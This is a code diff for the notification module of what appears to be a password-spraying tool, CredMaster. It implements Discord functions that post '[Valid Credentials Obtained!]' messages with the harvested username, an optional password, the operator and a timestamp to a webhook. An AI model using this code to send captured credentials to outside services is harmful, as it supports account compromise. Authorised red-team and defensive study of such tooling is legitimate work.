@@ -1,6 +1,6 @@
 import requests, json
 from datetime import datetime
-
+from discordwebhook import Discord
 
 
 def notify_success(username, password, notify_obj):
@@ -108,31 +108,49 @@ def slack_update(message, operator, webhook):
 
 # Function for posting username/password to Discord
 def discord_notify(username, password, operator, exclude_password, webhook):
-    # TODO
-    # - implement operator optional addition
-    # - implement exclude_password optional arg
-    # - implement the actual discord notify function lol
 
-    url = webhook
-    data = {
-    "content" : f"{message}",
-    "username" : "CredMaster-Bot"
-    }
-    response = requests.post(url, json = data)
+    now = datetime.now()
+    date=now.strftime("%d-%m-%Y")
+    time=now.strftime("%H:%M:%S")
+
+    op_insert = ""
+    if operator is not None:
+        op_insert = f"Operator: {operator}\n"
+
+    pwd_insert = f"Pass: {password}\n"
+    if exclude_password:
+        pwd_insert = ""
+
+    text = ("```[Valid Credentials Obtained!]\n"
+            f"{op_insert}"
+            f"User: {username}\n"
+            f"{pwd_insert}"
+            f"Date: {date}\n"
+            f"Time: {time}```")
+
+    discord = Discord(url=webhook)
+    discord.post(content=text)
 
 
 # Discord notify message
 def discord_update(message, operator, webhook):
-    # TODO
-    # - implement operator optional addition
-    # - implement the actual discord notify function lol
 
-    url = webhook
-    data = {
-    "content" : f"{message}",
-    "username" : "CredMaster-Bot"
-    }
-    response = requests.post(url, json = data)
+    now = datetime.now()
+    date=now.strftime("%d-%m-%Y")
+    time=now.strftime("%H:%M:%S")
+
+    op_insert = ""
+    if operator is not None:
+        op_insert = f"Operator: {operator}\n"
+
+    text = ("```[Log Entry]\n"
+            f"{op_insert}"
+            f"{message}\n"
+            f"Date: {date}\n"
+            f"Time: {time}```")
+
+    discord = Discord(url=webhook)
+    discord.post(content=text)
 
 
 # Teams notify function
